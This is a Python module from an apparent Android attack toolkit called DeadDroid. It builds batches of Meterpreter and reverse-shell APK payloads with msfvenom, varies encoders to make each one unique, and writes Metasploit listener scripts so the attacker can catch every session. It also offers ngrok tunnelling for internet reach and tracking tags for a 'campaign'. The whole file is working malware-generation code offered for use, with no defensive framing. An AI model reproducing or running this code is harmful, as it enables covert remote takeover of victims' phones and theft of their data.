"""
Mass Payload Generator — unique to DeadDroid.

Generate dozens of unique, differentiated Android payloads in a single batch:
- Different ports, encoders, iteration counts
- Unique output filenames
- Automatic handler RC scripts for all
- Summary table + ZIP export
- DNA tag per payload

No other tool can generate and track a full batch campaign of payloads.
"""

import time
import zipfile
from pathlib import Path
from typing import Optional
from rich.console import Console
from rich.prompt import Prompt, IntPrompt, Confirm
from rich.table import Table
from rich.progress import Progress, BarColumn, TaskProgressColumn, TextColumn, TimeElapsedColumn
from rich import box
from core.utils import (
    get_local_ip, find_free_port, PAYLOADS_DIR, run_cmd,
    check_tool, random_str, log_event
)

console = Console()

PAYLOAD_VARIANTS = [
    ("android/meterpreter/reverse_tcp",   "tcp"),
    ("android/meterpreter/reverse_https", "https"),
    ("android/meterpreter/reverse_http",  "http"),
    ("android/shell/reverse_tcp",         "shell_tcp"),
]

ENCODERS = [
    ("none",                  1),
    ("x86/shikata_ga_nai",   3),
    ("x86/shikata_ga_nai",   5),
    ("x86/shikata_ga_nai",   7),
]


def generate_batch(
    lhost: str,
    port_start: int,
    count: int,
    payloads_to_use: Optional[list[str]] = None,
    add_dna: bool = True,
    zip_output: bool = True,
) -> list[dict]:
    """
    Generate `count` unique payloads starting from `port_start`.
    Returns a list of dicts with metadata per payload.
    """
    if not check_tool("msfvenom"):
        console.print("[red]✘ msfvenom not found.[/]")
        return []

    results     = []
    current_port = port_start
    batch_id     = random_str(6)
    batch_dir    = PAYLOADS_DIR / f"batch_{batch_id}"
    batch_dir.mkdir(parents=True, exist_ok=True)

    all_variants = payloads_to_use or [v[0] for v in PAYLOAD_VARIANTS]

    with Progress(
        TextColumn("[bold cyan]Generating[/]"),
        BarColumn(),
        TaskProgressColumn(),
        TimeElapsedColumn(),
        console=console,
    ) as prog:
        task = prog.add_task("payloads", total=count)

        for i in range(count):
            # Cycle through variants + encoders
            variant_idx = i % len(PAYLOAD_VARIANTS)
            encoder_idx = i % len(ENCODERS)

            payload_type  = PAYLOAD_VARIANTS[variant_idx][0]
            payload_label = PAYLOAD_VARIANTS[variant_idx][1]
            encoder, iters = ENCODERS[encoder_idx]

            out_name = f"payload_{batch_id}_{i+1:03d}_{payload_label}_{current_port}.apk"
            out_path = batch_dir / out_name

            # Build msfvenom command
            cmd_parts = [
                "msfvenom",
                f"-p {payload_type}",
                f"LHOST={lhost}",
                f"LPORT={current_port}",
                "-f apk",
                f"-o \"{out_path}\"",
            ]
            if encoder != "none":
                cmd_parts += [f"-e {encoder}", f"-i {iters}"]

            cmd = " ".join(cmd_parts)
            rc, _, err = run_cmd(cmd, timeout=300)

            entry = {
                "index":   i + 1,
                "file":    out_name,
                "path":    str(out_path),
                "payload": payload_type,
                "encoder": encoder,
                "iters":   iters,
                "lhost":   lhost,
                "lport":   current_port,
                "success": rc == 0 and out_path.exists(),
                "dna":     "",
                "rc_path": "",
            }

            if entry["success"]:
                # Write handler RC script
                rc_path = out_path.with_suffix(".rc")
                rc_content = (
                    f"use exploit/multi/handler\n"
                    f"set PAYLOAD {payload_type}\n"
                    f"set LHOST {lhost}\n"
                    f"set LPORT {current_port}\n"
                    f"set ExitOnSession false\n"
                    f"set SessionCommunicationTimeout 0\n"
                    f"exploit -j -z\n"
                )
                rc_path.write_text(rc_content)
                entry["rc_path"] = str(rc_path)

                # DNA tagging
                if add_dna:
                    try:
                        from core.payload_dna import generate_dna
                        dna = generate_dna(
                            payload_path=str(out_path),
                            lhost=lhost,
                            lport=current_port,
                            notes=f"batch={batch_id}",
                        )
                        entry["dna"] = dna
                    except Exception:
                        pass

            results.append(entry)
            current_port += 1
            prog.update(task, advance=1)

    # Print summary table
    _print_batch_summary(results, batch_dir)

    # ZIP export
    if zip_output:
        zip_path = PAYLOADS_DIR / f"batch_{batch_id}.zip"
        _zip_batch(batch_dir, zip_path)

    log_event(f"Mass payload batch: batch_id={batch_id} count={count} lhost={lhost} start_port={port_start}")
    return results


def _print_batch_summary(results: list[dict], batch_dir: Path):
    ok    = sum(1 for r in results if r["success"])
    fail  = len(results) - ok

    t = Table(
        title=f"[bold cyan]Batch Summary — {ok}/{len(results)} succeeded[/]",
        box=box.SIMPLE_HEAVY,
        show_lines=True,
    )
    t.add_column("#",       style="dim",   width=5)
    t.add_column("File",    style="cyan")
    t.add_column("Payload", style="white")
    t.add_column("Encoder", style="yellow")
    t.add_column("Port",    style="green")
    t.add_column("DNA",     style="magenta")
    t.add_column("Status")

    for r in results:
        status = "[green]✔[/]" if r["success"] else "[red]✘[/]"
        t.add_row(
            str(r["index"]),
            r["file"][-45:],
            r["payload"].split("/")[-1],
            r["encoder"].split("/")[-1] if r["encoder"] != "none" else "none",
            str(r["lport"]),
            r.get("dna","")[:12],
            status,
        )
    console.print(t)
    console.print(f"\n[dim]  Batch directory:[/] {batch_dir}")

    # Generate master handler RC that loads all sessions
    master_rc = batch_dir / "master_handler.rc"
    lines = []
    for r in results:
        if r["success"]:
            lines += [
                f"use exploit/multi/handler",
                f"set PAYLOAD {r['payload']}",
                f"set LHOST {r['lhost']}",
                f"set LPORT {r['lport']}",
                f"set ExitOnSession false",
                "exploit -j -z",
            ]
    master_rc.write_text("\n".join(lines) + "\n")
    console.print(f"[green]✔ Master handler script:[/] {master_rc}")
    console.print(f"[dim]  Start with: msfconsole -r {master_rc}[/]")


def _zip_batch(batch_dir: Path, zip_path: Path):
    with zipfile.ZipFile(str(zip_path), "w", zipfile.ZIP_DEFLATED) as zf:
        for f in batch_dir.iterdir():
            zf.write(str(f), f.name)
    console.print(f"[green]✔ Batch ZIP:[/] {zip_path}  ({zip_path.stat().st_size:,} bytes)")


def interactive_mass():
    console.rule("[bold cyan]Mass Payload Generator[/]")
    console.print(
        "[dim]Generate a batch of unique payloads with different ports,\n"
        "encoders and iterations. All get DNA tags and handler scripts.[/]\n"
    )

    lhost      = Prompt.ask("LHOST", default=get_local_ip())
    port_start = IntPrompt.ask("Starting port", default=find_free_port(4444))
    count      = IntPrompt.ask("Number of payloads to generate", default=5)

    if count > 50:
        from rich.prompt import Confirm
        if not Confirm.ask(f"Generate {count} payloads? This may take a while.", default=True):
            return

    add_dna = Confirm.ask("Add DNA tracking tags?", default=True)
    zip_out = Confirm.ask("ZIP all outputs?", default=True)

    use_ngrok = Confirm.ask("Use ngrok for LHOST?", default=False)
    if use_ngrok:
        from core.ngrok_handler import start_ngrok_tcp
        tunnel = start_ngrok_tcp(port_start)
        if tunnel:
            lhost = tunnel["host"]
            console.print(f"[green]✔ ngrok host:[/] {lhost}")

    generate_batch(
        lhost=lhost,
        port_start=port_start,
        count=count,
        add_dna=add_dna,
        zip_output=zip_out,
    )
